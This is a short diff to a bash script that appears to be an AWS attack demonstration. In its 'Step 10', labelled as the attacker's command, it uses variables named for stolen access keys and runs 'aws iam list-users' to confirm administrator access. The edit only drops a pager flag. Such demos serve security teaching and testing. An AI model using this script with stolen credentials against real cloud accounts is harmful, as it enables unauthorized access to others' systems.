@@ -395,8 +395,8 @@ if [ -n "$STOLEN_ACCESS_KEY" ] && [ -n "$STOLEN_SECRET_KEY" ] && [ -n "$STOLEN_S
     echo -e "${YELLOW}Step 10: Verifying administrator access${NC}"
     echo "Attempting to list IAM users..."
 
-    show_cmd "Attacker" "aws iam list-users --max-items 3 --output table --no-cli-pager"
-    if aws iam list-users --max-items 3 --output table --no-cli-pager; then
+    show_cmd "Attacker" "aws iam list-users --max-items 3 --output table"
+    if aws iam list-users --max-items 3 --output table; then
         echo -e "${GREEN}Completed: Successfully listed IAM users!${NC}"
         echo -e "${GREEN}ADMIN ACCESS CONFIRMED${NC}"
     else
